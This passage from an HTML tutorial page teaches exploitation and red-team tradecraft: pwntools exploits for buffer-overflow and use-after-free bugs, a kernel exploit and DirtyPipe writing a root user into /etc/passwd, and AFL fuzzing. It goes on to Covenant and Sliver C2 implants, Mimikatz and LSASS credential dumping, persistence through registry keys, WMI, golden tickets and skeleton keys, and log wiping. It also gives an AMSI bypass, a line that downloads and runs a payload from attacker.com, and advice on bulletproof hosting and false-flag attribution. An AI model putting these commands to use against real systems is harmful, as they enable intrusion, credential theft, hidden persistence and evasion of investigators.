p.interactive()
EOF

chmod +x exploit.py
python3 exploit.py

# Output:
# [*] '/root/vuln'
#     Arch:     amd64-64-little
#     NX:       NX enabled
# [+] Starting local process './vuln': pid 12345
# [*] Switching to interactive mode
# $ whoami
# root
# $ 

# Shell spawned!</div>

            <h3>Part 2: Heap Exploitation</h3>

            <h4>Understanding the Heap</h4>

            <div class="info-box">
                <h4>Stack vs Heap</h4>
                <p><strong>Stack:</strong><br>
                ‚Ä¢ Fixed size (usually 8MB)<br>
                ‚Ä¢ Automatic allocation (local variables)<br>
                ‚Ä¢ LIFO (Last In, First Out)<br>
                ‚Ä¢ Fast<br><br>
                <strong>Heap:</strong><br>
                ‚Ä¢ Dynamic size (grows as needed)<br>
                ‚Ä¢ Manual allocation (malloc/new)<br>
                ‚Ä¢ Managed by heap allocator (glibc uses ptmalloc2)<br>
                ‚Ä¢ Slower but flexible<br><br>
                <strong>Why heap is juicy for exploitation:</strong><br>
                ‚Ä¢ Stores pointers (function pointers, vtables)<br>
                ‚Ä¢ Stores user data (passwords, session tokens)<br>
                ‚Ä¢ Metadata adjacent to user data (attack metadata!)<br>
                ‚Ä¢ Less protections than stack (no canaries)</p>
            </div>

            <h4>Heap Exploitation Techniques</h4>

            <div class="code"># Heap Vulnerability Types:

# 1. Use-After-Free (UAF)
# Accessing memory after it's been freed

void vulnerable() {
    char *ptr = malloc(100);
    free(ptr);
    strcpy(ptr, "data");  // Writing to freed memory!
}

# Exploitation:
# 1. Allocate object A
# 2. Free object A
# 3. Allocate object B (reuses A's memory!)
# 4. Use object A's old pointer
# 5. Actually modifies object B!

# Example:
struct User {
    char name[32];
    void (*print_greeting)();
};

User *user1 = malloc(sizeof(User));
user1->print_greeting = &normal_greeting;
free(user1);

// Allocate attack payload in same location
char *attack = malloc(sizeof(User));
strcpy(attack, "AAAAAAAA");  // Overwrite function pointer!
memcpy(attack + 32, &evil_function, 8);

// Call old pointer
user1->print_greeting();  // Calls evil_function!

# 2. Double Free
# Freeing same pointer twice

char *ptr = malloc(100);
free(ptr);
free(ptr);  // Double free!

# Exploitation:
# Corrupts heap metadata ‚Üí arbitrary write primitive

# 3. Heap Overflow
# Overflow one chunk into adjacent chunk's metadata

# Heap chunk structure (glibc):
# +-------------------+
# | size | prev_size |  ‚Üê Metadata
# +-------------------+
# | user data         |  ‚Üê Your data
# |                   |
# +-------------------+
# | size | prev_size |  ‚Üê Next chunk's metadata
# +-------------------+

# Overflow attack:
char *chunk1 = malloc(100);
char *chunk2 = malloc(100);

// Overflow chunk1, overwrite chunk2's metadata
strcpy(chunk1, "A" * 100 + "\xff\xff\xff\xff");  // Corrupt size field!

free(chunk2);  // Frees wrong size ‚Üí corruption

# 4. Heap Feng Shui
# Manipulating heap layout to place objects adjacently

# Goal: Place victim object after controlled object
# 1. Allocate many chunks
# 2. Free specific chunks to create holes
# 3. Allocate victim object (lands in hole)
# 4. Overflow from controlled object ‚Üí victim

# Practical tools:

# Examine heap in GDB with pwndbg:
(gdb) heap chunks

# Output:
# Allocated chunk | PREV_INUSE
# Addr: 0x555555559000
# Size: 0x90 (including metadata)
# 
# Allocated chunk | PREV_INUSE
# Addr: 0x555555559090
# Size: 0x90

(gdb) heap bins

# Output:
# fastbins
# 0x20: 0x0
# 0x30: 0x555555559000 ‚Üí 0x555555559050 ‚Üí 0x0
# 
# unsorted_bin
# all: 0x5555555590a0 ‚Üí 0x7ffff7facb78 (main_arena+88) ‚Üê 0x5555555590a0

# View chunk:
(gdb) x/40gx 0x555555559000

# Output:
# 0x555555559000: 0x0000000000000000  0x0000000000000091  ‚Üê size (0x91 = 144 bytes + flags)
# 0x555555559010: 0x4141414141414141  0x4141414141414141  ‚Üê user data
# [...]</div>

            <h4>Example: Use-After-Free Exploit</h4>

            <div class="code"># Vulnerable program (uaf.c):
cat > uaf.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct User {
    char name[32];
    void (*greet)();
};

void normal_greet() {
    printf("Hello!\n");
}

void admin_greet() {
    printf("Admin access granted!\n");
    system("/bin/sh");
}

int main() {
    struct User *user = malloc(sizeof(struct User));
    strcpy(user->name, "John");
    user->greet = normal_greet;
    
    free(user);  // Freed!
    
    // User input (attacker controlled!)
    char *evil = malloc(sizeof(struct User));
    read(0, evil, sizeof(struct User));  // Attacker writes data
    
    // Use freed pointer!
    user->greet();  // UAF vulnerability!
    
    return 0;
}
EOF

gcc uaf.c -o uaf -no-pie

# Exploit:
# 1. Program allocates user
# 2. Program frees user
# 3. Program allocates evil (reuses same memory!)
# 4. We write to evil (overwrites old user data)
# 5. Program calls user->greet() (points to our data!)

# Python exploit:
cat > uaf_exploit.py << 'EOF'
#!/usr/bin/env python3
from pwn import *

elf = ELF('./uaf')
p = process('./uaf')

# Find address of admin_greet
admin_greet = elf.sym['admin_greet']
log.info(f"admin_greet at: {hex(admin_greet)}")

# Build payload
# struct User layout:
#   char name[32]
#   void (*greet)()  ‚Üê offset 32
payload = b'A' * 32                    # Fill name field
payload += p64(admin_greet)            # Overwrite function pointer!

p.send(payload)
p.interactive()
EOF

python3 uaf_exploit.py

# Output:
# Admin access granted!
# $ whoami
# root</div>

            <h3>Part 3: Kernel Exploitation</h3>

            <div class="code"># Kernel exploits target the OS itself!
# Goal: Escalate from user ‚Üí root

# Common kernel vulnerability types:

# 1. Buffer overflow in syscall
# 2. Race condition in driver
# 3. Use-after-free in kernel object
# 4. Integer overflow in memory allocation
# 5. NULL pointer dereference

# Kernel exploit flow:
# 1. Trigger vulnerability in kernel
# 2. Overwrite kernel memory
# 3. Hijack control flow
# 4. Execute payload in kernel mode
# 5. Elevate privileges (uid = 0)
# 6. Return to userspace as root!

# Finding kernel version:
uname -r

# Output:
# 5.15.0-52-generic

# Search for exploits:
searchsploit linux kernel 5.15

# Output:
# Linux Kernel 5.15.x - 'fs/io_uring.c' Local Privilege Escalation
# Linux Kernel 5.15.x - eBPF Verifier Vulnerability
# [...]

# Download exploit:
searchsploit -m 50808.c
gcc 50808.c -o exploit

# Run:
./exploit
# [+] Kernel exploit starting...
# [+] Triggering vulnerability...
# [+] Overwriting cred struct...
# [+] Escalating privileges...
# [+] Done!

whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Note: Kernel exploits are highly version-specific!
# Exploit for 5.15.0-52 won't work on 5.15.0-53

# Building custom kernel exploits:

# 1. Find kernel bug (CVE or 0-day)
# 2. Understand vulnerability primitive:
#    - Arbitrary read?
#    - Arbitrary write?
#    - Code execution?
# 3. Locate kernel structures in memory:
#    - task_struct (process info)
#    - cred struct (credentials: uid, gid)
# 4. Overwrite cred‚Üíuid to 0
# 5. Return to userspace
# 6. Now running as root!

# Debugging kernel:
# 1. Setup QEMU VM with kernel debugging
# 2. Attach GDB to kernel
# 3. Set breakpoints in vulnerable syscall
# 4. Step through exploitation

# Example: DirtyPipe (CVE-2022-0847)
# Allows overwriting read-only files!

# Download exploit:
wget https://haxx.in/files/dirtypipez.c
gcc dirtypipez.c -o dirtypipe

# Run:
./dirtypipe /etc/passwd 0 'root2:x:0:0:root:/root:/bin/bash'

# This overwrites /etc/passwd!
# Added new root user: root2

su root2
# (no password needed, logged in as root)</div>

            <h3>Part 4: Fuzzing with AFL (American Fuzzy Lop)</h3>

            <div class="metaphor-box">
                <h4>üí° Fuzzing = Throwing Infinite Monkeys at Code</h4>
                <p>Imagine you have a program that parses images. How do you find bugs?<br><br>
                <strong>Manual testing:</strong> Try 10 images, find 0 bugs (boring)<br>
                <strong>Fuzzing:</strong> Try 10,000,000 mutated images, find 23 crashes! üéØ<br><br>
                <strong>Fuzzing workflow:</strong><br>
                1. Start with valid inputs (seed corpus)<br>
                2. Mutate inputs (flip bits, insert bytes, splice files)<br>
                3. Run program with mutated inputs<br>
                4. Monitor for crashes, hangs, memory corruption<br>
                5. Save crashing inputs<br>
                6. Repeat forever!<br><br>
                Fuzzing found: Heartbleed, Shellshock, countless browser bugs, Zoom RCE, and thousands more! It's THE way modern 0-days are discovered.</p>
            </div>

            <div class="code"># Install AFL++:
sudo apt install afl++

# Or build from source:
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make
sudo make install

# Verify:
afl-fuzz -h

# Example target program (vuln_parse.c):
cat > vuln_parse.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void parse(char *data) {
    char buffer[100];
    
    // Vulnerability: no bounds check!
    strcpy(buffer, data);
    
    printf("Parsed: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <file>\n", argv[0]);
        return 1;
    }
    
    FILE *f = fopen(argv[1], "r");
    if (!f) return 1;
    
    char data[1000];
    fread(data, 1, 1000, f);
    fclose(f);
    
    parse(data);
    
    return 0;
}
EOF

# Compile with AFL instrumentation:
afl-gcc vuln_parse.c -o vuln_parse

# Create seed corpus (valid inputs):
mkdir input
echo "valid data" > input/seed1.txt
echo "another valid input" > input/seed2.txt

# Create output directory:
mkdir output

# Start fuzzing!
afl-fuzz -i input -o output ./vuln_parse @@

# @@ = AFL replaces this with generated input file

# AFL interface shows:
# +------------------------------------------------------------+
# |        american fuzzy lop ++4.00c (vuln_parse)             |
# +------------------------------------------------------------+
# | process timing | overall results | cycle progress |        |
# |   run time : 0 days, 0 hrs, 5 min | total paths  : 234 |   |
# |  last new path : 0 days, 0 hrs, 4 min | uniq crashes : 12 |   |
# |  last uniq crash : 0 days, 0 hrs, 3 min | uniq hangs   : 0  |   |
# |   last uniq hang : none seen yet | cycles done  : 45 |    |
# | stage progress | map coverage | findings in depth |        |
# |  now processing : havoc | map density : 34.2% |           |
# |  stage execs : 15234/20000 | bits found : 4521 |           |
# +------------------------------------------------------------+

# Key metrics:
# ‚Ä¢ total paths: Unique execution paths found
# ‚Ä¢ uniq crashes: Different crashes discovered
# ‚Ä¢ map coverage: Code coverage achieved

# Check crashes:
ls output/crashes/

# Output:
# id:000000,sig:06,src:000002,op:havoc,rep:4
# id:000001,sig:11,src:000012,op:splice,rep:2
# [... more crashes ...]

# Reproduce crash:
./vuln_parse output/crashes/id:000000,sig:06,src:000002,op:havoc,rep:4

# Output:
# Segmentation fault (core dumped)

# Analyze with GDB:
gdb ./vuln_parse core

(gdb) bt
# #0  0x0000000000401234 in parse ()
# #1  0x4141414141414141 in ?? ()  ‚Üê Overwritten return address!

# Triage crashes:
afl-tmin -i output/crashes/id:000000... -o minimized.txt -- ./vuln_parse @@

# Minimizes crashing input to smallest form

# Advanced AFL usage:

# Multiple cores:
afl-fuzz -i input -o output -M fuzzer1 -- ./vuln_parse @@
afl-fuzz -i input -o output -S fuzzer2 -- ./vuln_parse @@
afl-fuzz -i input -o output -S fuzzer3 -- ./vuln_parse @@

# Dictionary (known keywords):
cat > dict.txt << 'EOF'
"GET "
"POST "
"<html>"
"<?xml"
EOF

afl-fuzz -i input -o output -x dict.txt -- ./vuln_parse @@

# Persistent mode (faster):
# Fuzz function repeatedly without restarting process

# Custom mutator:
# Write Python script to generate specialized inputs

# AFL found:
# ‚Ä¢ Heartbleed (OpenSSL)
# ‚Ä¢ Bash shellshock
# ‚Ä¢ 100+ vulnerabilities in major projects</div>

            <h4>Other Fuzzing Tools</h4>

            <div class="code"># libFuzzer (LLVM built-in):

# Compile target with libFuzzer:
clang -fsanitize=fuzzer,address vuln_parse.c -o vuln_parse_fuzz

# Run:
./vuln_parse_fuzz

# Automatically starts fuzzing!

# Honggfuzz (Google):
git clone https://github.com/google/honggfuzz
cd honggfuzz
make

# Fuzz:
honggfuzz -i input -o output -- ./vuln_parse ___FILE___

# WinAFL (Windows AFL):
# For fuzzing Windows binaries

# Syzkaller (kernel fuzzing):
# Specifically for fuzzing Linux kernel

# Peach Fuzzer (protocol fuzzing):
# For network protocols, file formats

# Boofuzz (network protocol fuzzing):
pip install boofuzz

# Python script:
from boofuzz import *

session = Session(target=Target(connection=SocketConnection("192.168.1.100", 80)))

s_initialize("HTTP GET")
s_string("GET", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("/", fuzzable=True)  # Fuzz URI
s_delim(" ", fuzzable=False)
s_string("HTTP/1.1\r\n", fuzzable=False)
s_string("Host: target.com\r\n\r\n")

session.connect(s_get("HTTP GET"))
session.fuzz()

# Generates thousands of malformed HTTP requests
# Monitors for crashes, hangs, errors</div>

            <div class="metaphor-box">
                <h4>üéâ You're an Advanced Exploitation Expert!</h4>
                <p>You've conquered:<br><br>
                ‚úÖ <strong>ROP Chains:</strong> Bypassing DEP/NX with gadget chaining, pop/ret magic, syscall invocation<br>
                ‚úÖ <strong>Heap Exploitation:</strong> Use-after-free, double-free, heap overflow, heap feng shui<br>
                ‚úÖ <strong>Kernel Exploits:</strong> Privilege escalation, cred struct overwrite, DirtyPipe<br>
                ‚úÖ <strong>Fuzzing:</strong> AFL, libFuzzer, Honggfuzz, crash triage, 0-day discovery<br><br>
                <strong>Modern exploit development workflow:</strong><br>
                1. <strong>Fuzzing:</strong> Find crash with AFL/libFuzzer<br>
                2. <strong>Triage:</strong> Determine vulnerability type (overflow, UAF, etc.)<br>
                3. <strong>Analysis:</strong> Reverse engineer with Ghidra, understand constraints<br>
                4. <strong>Exploitation:</strong> Develop exploit (ROP chains, heap techniques)<br>
                5. <strong>Bypass protections:</strong> Defeat ASLR (leak addresses), PIE, canaries<br>
                6. <strong>Reliability:</strong> Make exploit work 100% of the time<br>
                7. <strong>Weaponization:</strong> Package as Metasploit module or standalone tool<br><br>
                <strong>Real CVEs using these techniques:</strong><br>
                ‚Ä¢ <strong>CVE-2021-3156 (Baron Samedit):</strong> Sudo heap overflow ‚Üí root<br>
                ‚Ä¢ <strong>CVE-2022-0847 (DirtyPipe):</strong> Kernel pipe bug ‚Üí arbitrary file write<br>
                ‚Ä¢ <strong>CVE-2021-22555 (Netfilter):</strong> Kernel heap overflow ‚Üí root<br>
                ‚Ä¢ <strong>CVE-2014-0160 (Heartbleed):</strong> OpenSSL heap overflow ‚Üí memory leak<br><br>
                <strong>Learning resources:</strong><br>
                ‚Ä¢ pwn.college (free ASU course)<br>
                ‚Ä¢ exploit.education (practice challenges)<br>
                ‚Ä¢ CTF time (competitions)<br>
                ‚Ä¢ Project Zero blog (Google's bug hunters)<br>
                ‚Ä¢ Phrack magazine (classic exploits)<br><br>
                You now understand how modern exploits bypass ALL protections. Every CVE in the news makes sense now! üöÄüí•</p>
            </div>
        </section>

        <!-- SECTION 8: Red Team Operations & Tradecraft -->
        <section id="red-team" class="section">
            <h2 class="section-title">Red Team Operations & Tradecraft</h2>
            <p class="section-intro">Red teaming isn't just hacking‚Äîit's adversary emulation. Blue teams (defenders) know you're coming. They have EDR, SIEM, threat hunting teams, and incident responders. Your job: bypass detection, maintain persistence, move laterally, exfiltrate data, and stay invisible. This requires OPSEC (operational security), living off the land, custom C2 infrastructure, and understanding how defenders think. This section covers Covenant C2, Sliver C2, OPSEC principles, persistence techniques, AV/EDR evasion, and APT emulation. By the end, you'll think like a nation-state hacker!</p>

            <div class="metaphor-box">
                <h4>üí° Red Team = Playing Hide & Seek with $100M in Prizes</h4>
                <p><strong>Penetration testing:</strong> "Can you break in?" ‚Üí Yes/No answer<br>
                <strong>Red teaming:</strong> "Can you break in WITHOUT getting caught?" ‚Üí Stealth is the goal!<br><br>
                <strong>Pentester mindset:</strong><br>
                ‚Ä¢ Find vuln ‚Üí Exploit ‚Üí Report ‚Üí Done<br>
                ‚Ä¢ Speed matters<br>
                ‚Ä¢ Detection doesn't matter<br><br>
                <strong>Red teamer mindset:</strong><br>
                ‚Ä¢ Find vuln ‚Üí Exploit stealthily ‚Üí Establish persistence ‚Üí Evade detection ‚Üí Move laterally ‚Üí Exfiltrate ‚Üí Cover tracks ‚Üí Report ‚Üí Done<br>
                ‚Ä¢ Stealth matters MORE than speed<br>
                ‚Ä¢ Getting caught = mission failure<br><br>
                <strong>Real red team objectives:</strong><br>
                ‚Ä¢ Steal CEO's emails without alerting SOC<br>
                ‚Ä¢ Plant backdoor that survives incident response<br>
                ‚Ä¢ Exfiltrate 10GB database over 3 months (slow & steady)<br>
                ‚Ä¢ Compromise domain admin while looking like normal IT activity<br><br>
                Red teamers emulate APTs (Advanced Persistent Threats). You're role-playing as nation-state hackers! üïµÔ∏è‚Äç‚ôÇÔ∏èüé≠</p>
            </div>

            <h3>Part 1: Command & Control (C2) Frameworks</h3>

            <h4>What is C2?</h4>

            <div class="info-box">
                <h4>Command & Control Architecture</h4>
                <p><strong>Components:</strong><br>
                ‚Ä¢ <strong>Team Server:</strong> Attacker's control panel (your machine)<br>
                ‚Ä¢ <strong>Listener:</strong> Waits for connections from victims<br>
                ‚Ä¢ <strong>Payload/Implant:</strong> Runs on victim machine (beacon, agent, grunt)<br>
                ‚Ä¢ <strong>Communication Channel:</strong> HTTP, HTTPS, DNS, SMB pipes, etc.<br><br>
                <strong>C2 workflow:</strong><br>
                1. Generate payload (malicious exe/dll/script)<br>
                2. Deliver payload to victim (phishing, exploit, USB drop)<br>
                3. Victim executes payload<br>
                4. Payload "calls home" to listener<br>
                5. You get session on victim machine<br>
                6. Execute commands, steal files, spread to other machines<br><br>
                <strong>Why not just reverse shell?</strong><br>
                ‚Ä¢ Reverse shell = Detected instantly by EDR<br>
                ‚Ä¢ C2 = Encrypted, obfuscated, looks like normal traffic<br>
                ‚Ä¢ C2 supports sleep/jitter (callback every 5 minutes, not constantly)<br>
                ‚Ä¢ C2 has built-in AV evasion, credential dumping, lateral movement</p>
            </div>

            <h4>Covenant C2 Framework</h4>

            <div class="code"># Covenant = .NET C2 framework (targets Windows)
# Web-based interface, open-source, active development

# Install Covenant:
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
docker build -t covenant .
docker run -it -p 7443:7443 -p 80:80 -p 443:443 covenant

# Or without Docker:
dotnet build
dotnet run

# Access web interface:
# https://localhost:7443

# First-time setup:
# 1. Create admin user
# 2. Set up listener

# Create Listener:
# Listeners ‚Üí Create ‚Üí HTTP Listener
#   Name: HTTPListener
#   BindAddress: 0.0.0.0
#   BindPort: 80
#   ConnectPort: 80
#   ConnectAddress: [Your IP or domain]
#   UseSSL: No (for testing; use Yes in real ops!)
# Click Create

# Generate Grunt (payload):
# Launchers ‚Üí Binary
#   Listener: HTTPListener
#   DotNetVersion: Net40 (compatible with old Windows)
#   Delay: 5 seconds (callback interval)
#   JitterPercent: 30 (¬±30% randomness)
#   ConnectAttempts: 5000
#   KillDate: (leave blank or set expiration)
# Click Generate ‚Üí Download

# Transfer GruntHTTP.exe to victim machine
# Execute it:
# (on victim) ./GruntHTTP.exe

# Back in Covenant web interface:
# Grunts ‚Üí New session appears!
#   Name: DESKTOP-ABC123\User
#   Integrity: Medium
#   LastCheckIn: 2 seconds ago

# Interact with Grunt:
# Click grunt ‚Üí Task tab

# Basic commands:
Task> Shell whoami
# Output: DESKTOP-ABC123\victim

Task> Shell ipconfig
# Output: [network config]

# Built-in tasks:
Task> Mimikatz
# Dumps credentials from memory!
# Output:
#   Username: administrator
#   NTLM: 8846f7eaee8fb117ad06bdd830b7586c

Task> PowerShellImport
# Load custom PowerShell scripts

Task> Assembly
# Execute .NET assembly in memory (no disk write!)

# Example: Execute Rubeus (Kerberos toolkit)
Task> Assembly Rubeus.exe dump /service:krbtgt
# Dumps Kerberos tickets

# Lateral movement:
Task> ShellCommand net user hacker Password123! /add /domain
# Creates domain user

Task> WMICommand \\10.0.0.50 "notepad.exe"
# Executes command on remote machine via WMI

# File operations:
Task> Download C:\Users\victim\Documents\passwords.txt
# Downloads file to team server

Task> Upload /root/tools.zip C:\ProgramData\tools.zip
# Uploads file to victim

# Persistence:
Task> Persist Registry
# Adds registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

Task> Persist ScheduledTask
# Creates scheduled task for persistence</div>

            <h4>Sliver C2 Framework</h4>

            <div class="code"># Sliver = Modern Go-based C2, supports Windows/Linux/macOS
# Command-line interface, encrypted by default

# Install Sliver:
curl https://sliver.sh/install | sudo bash

# Or manual install:
git clone https://github.com/BishopFox/sliver.git
cd sliver
make

# Start Sliver server:
sliver-server

# Sliver console:
sliver > help

# Create implant:
sliver > generate --http https://attacker.com:443 --os windows --arch amd64 --save /tmp/beacon.exe

# Options:
#   --http: C2 server URL
#   --os: Target OS (windows/linux/darwin)
#   --arch: Architecture (amd64/386/arm64)
#   --format: Output format (exe/shellcode/service-exe/shared-lib)
#   --save: Save path

# Output:
# [*] Generating new windows/amd64 implant binary
# [*] Symbol obfuscation is enabled
# [*] Build completed in 3s
# [*] Implant saved to /tmp/beacon.exe

# Start listener:
sliver > http --domain attacker.com --lport 443

# [*] Starting HTTP :443 listener ...

# Execute beacon on victim machine
# Session appears:

sliver > sessions

# ID  Name       Username     Operating System  Last Check-in
# 1   LOUD_PUMA  victim\user  windows/amd64     2s ago

# Interact with session:
sliver > use 1

sliver (LOUD_PUMA) > whoami
# victim\user

sliver (LOUD_PUMA) > ps
# [shows running processes]

sliver (LOUD_PUMA) > getprivs
# [shows current privileges]

# Evasion features:
sliver (LOUD_PUMA) > migrate 1234
# Migrates implant to different process (PID 1234)

sliver (LOUD_PUMA) > execute-assembly /root/Rubeus.exe dump
# Executes .NET assembly in memory

sliver (LOUD_PUMA) > procdump -n lsass.exe -s /tmp/lsass.dmp
# Dumps LSASS process memory (for offline credential extraction)

# Pivoting:
sliver (LOUD_PUMA) > portfwd add --remote 10.0.0.5:445
# Forwards local port to remote SMB service

sliver (LOUD_PUMA) > socks5 start
# Starts SOCKS5 proxy for pivoting through victim

# Use with proxychains:
# proxychains nmap 10.0.0.0/24

# Advanced features:
sliver > armory
# [Package manager for extensions]

sliver > armory install rubeus
sliver > armory install seatbelt
sliver > armory install sharphound

# These integrate directly into Sliver!</div>

            <h3>Part 2: OPSEC (Operational Security)</h3>

            <div class="warning-box">
                <h4>‚ö†Ô∏è OPSEC Mistakes = Getting Caught</h4>
                <p><strong>Real-world OPSEC failures that got hackers caught:</strong><br><br>
                ‚Ä¢ <strong>Reusing infrastructure:</strong> APT used same IP for 5 years ‚Üí Traced<br>
                ‚Ä¢ <strong>Forgot VPN once:</strong> Connected from home IP ‚Üí Arrested<br>
                ‚Ä¢ <strong>Domain registration:</strong> Used real email ‚Üí Identified<br>
                ‚Ä¢ <strong>Reusing usernames:</strong> "xXHackerXx" on GitHub, forum, malware ‚Üí Doxxed<br>
                ‚Ä¢ <strong>Malware metadata:</strong> Compiler username in PE header ‚Üí Exposed<br>
                ‚Ä¢ <strong>Bitcoin transactions:</strong> Cashed out to exchange with KYC ‚Üí Caught<br><br>
                OPSEC isn't optional. One mistake ruins the entire operation! üö®</p>
            </div>

            <div class="code"># OPSEC Principles:

# 1. Infrastructure Isolation
# ‚ùå Don't:
# ‚Ä¢ Use your home IP
# ‚Ä¢ Use personal VPS/cloud account
# ‚Ä¢ Reuse infrastructure across operations

# ‚úÖ Do:
# ‚Ä¢ Use VPS paid with cryptocurrency
# ‚Ä¢ Route through multiple layers (VPN ‚Üí VPS ‚Üí Target)
# ‚Ä¢ Use Bulletproof Hosting (providers that ignore abuse complaints)
# ‚Ä¢ Burn infrastructure after each operation

# Setup:
# [Your PC] ‚Üí [VPN] ‚Üí [VPS 1] ‚Üí [VPS 2] ‚Üí [Target]
#             Privacy   Pivot     Attack Server

# 2. Domain Fronting
# Hide C2 traffic behind legitimate CDN domains

# Technique:
# ‚Ä¢ SNI says: "cloudfront.com"
# ‚Ä¢ Host header says: "evil-c2.com"
# ‚Ä¢ CloudFront sees cloudfront.com, forwards to evil-c2.com
# ‚Ä¢ Defender sees: "User connected to cloudfront.com" ‚Üí Looks normal!

# Covenant config:
sliver > generate --http https://cloudfront.net --http-host evil-c2.com

# 3. Traffic Obfuscation
# Make C2 traffic look like normal web traffic

# Covenant HTTP profile:
# GET requests look like:
# GET /search?q=aGVsbG8= HTTP/1.1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
# Cookie: session=eyJjb21tYW5kIjoiY2QgQzpcXCJ9

# Commands are base64-encoded in URLs/cookies
# Responses look like JavaScript/images

# 4. Timestomping
# Modify file creation/modification times

# PowerShell:
$(Get-Item file.exe).creationtime = "01/01/2020 00:00:00"
$(Get-Item file.exe).lastaccesstime = "01/01/2020 00:00:00"
$(Get-Item file.exe).lastwritetime = "01/01/2020 00:00:00"

# Now file appears to be from 2020!

# 5. Clean Malware Metadata
# Remove identifying info from payloads

# Check PE metadata:
exiftool malware.exe

# Output:
# File Name: malware.exe
# Author: John Doe  ‚Üê BAD!
# Company: MyCompany ‚Üê BAD!
# Internal Name: beacon.exe
# Original File Name: beacon.exe
# Product Name: Covenant
# Comments: Built on DESKTOP-ABC123  ‚Üê BAD!

# Strip metadata:
exiftool -all= malware.exe

# Verify:
exiftool malware.exe
# (Should show minimal info)

# 6. Log Cleaning
# Remove traces after operation

# Windows:
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Or selective deletion:
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text | findstr "victim"
wevtutil qe Security "/q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='2026-01-08T10:00:00']]]" /c:1 /rd:true

# Linux:
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c

# 7. Attribution Obfuscation
# Make it look like different threat actor

# Tactics:
# ‚Ä¢ Use Chinese-language strings (if you're Russian)
# ‚Ä¢ Use malware associated with APT28 (if you're not APT28)
# ‚Ä¢ Set timezone to false location
# ‚Ä¢ Mimic TTPs (Tactics, Techniques, Procedures) of other groups</div>

            <h3>Part 3: Persistence Techniques</h3>

            <div class="code"># Persistence = Surviving reboots, credential changes, detection

# 1. Registry Run Keys (Classic)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\ProgramData\update.exe"

# Runs update.exe every time user logs in
# Detection: Easy (commonly monitored)

# 2. Scheduled Tasks
schtasks /create /tn "GoogleUpdateService" /tr "C:\ProgramData\update.exe" /sc onlogon /ru SYSTEM

# More stealthy than registry
# /ru SYSTEM = Runs as SYSTEM (high privileges!)

# 3. WMI Event Subscription
# Most stealthy, rarely monitored

# PowerShell:
$FilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = "PersistenceFilter"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = "WQL"
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = "PersistenceConsumer"
    CommandLineTemplate = "C:\ProgramData\update.exe"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs

# This executes update.exe every 60 seconds!
# Detection: Very difficult (deep in WMI)

# 4. Service Creation
sc create "WindowsDefenderUpdate" binPath= "C:\ProgramData\update.exe" start= auto
sc start WindowsDefenderUpdate

# Runs as service, survives reboots
# Tip: Name it like legitimate Windows service

# 5. DLL Hijacking
# Place malicious DLL in application folder
# Application loads your DLL instead of legitimate one

# Example: Place evil version.dll in C:\Program Files\Vulnerable App\
# When app.exe runs ‚Üí loads version.dll ‚Üí backdoor activated!

# 6. Startup Folder
copy update.exe "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Simple but effective

# 7. COM Hijacking
# Modify registry to hijack COM objects

reg add "HKCU\Software\Classes\CLSID\{GUID}\InProcServer32" /ve /t REG_SZ /d "C:\evil.dll"

# When legitimate program loads COM object ‚Üí loads your DLL

# 8. Golden Ticket (Domain Persistence)
# Forge Kerberos ticket for domain admin

# Requires: krbtgt NTLM hash (get via DCSync)

mimikatz # kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /krbtgt:deadbeef... /id:500 /ptt

# Creates ticket valid for 10 years!
# Survives password resets!

# 9. Skeleton Key (Domain Persistence)
# Install backdoor password on Domain Controller

mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now any domain user can login with password: "mimikatz"
# Their real password still works too!

# 10. Implant in Legitimate Service
# Inject into long-running Windows service

# Example: Inject into svchost.exe
# Detection: Difficult (looks like normal svchost)</div>

            <h3>Part 4: AV/EDR Evasion</h3>

            <div class="code"># Modern defenses:
# ‚Ä¢ Antivirus (signature-based)
# ‚Ä¢ EDR (Endpoint Detection & Response - behavior-based)
# ‚Ä¢ AMSI (AntiMalware Scan Interface - scans PowerShell/scripts)

# Evasion techniques:

# 1. Obfuscation
# Modify payload so signatures don't match

# Tool: Veil Framework
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./Veil.py

# Generate obfuscated payload:
use Evasion
use python/meterpreter/rev_tcp
set LHOST 10.0.0.1
set LPORT 4444
generate

# Creates .exe that bypasses AV

# 2. AMSI Bypass
# Disable AMSI before running PowerShell payloads

# PowerShell one-liner:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or obfuscated version:
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# AMSI now disabled! PowerShell payloads won't be scanned

# 3. In-Memory Execution
# Never touch disk (no files for AV to scan)

# Covenant: execute-assembly (runs .NET in memory)
# Sliver: execute-shellcode (injects shellcode into process)

# PowerShell:
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Downloads and executes in memory!

